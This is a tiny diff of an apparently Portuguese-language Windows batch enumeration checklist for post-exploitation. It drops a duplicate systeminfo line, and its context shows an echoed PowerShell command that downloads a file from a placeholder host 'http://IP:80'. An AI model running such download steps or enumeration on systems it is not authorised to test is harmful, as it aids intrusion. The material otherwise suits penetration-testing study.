@@ -50,7 +50,6 @@ echo powershell -Command "iwr -outf test.txt http://IP:80/test.txt"
 ECHO.
 echo 15. Qual o kernel?
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ECHO.
 
 TITLE Perguntas a serem feitas
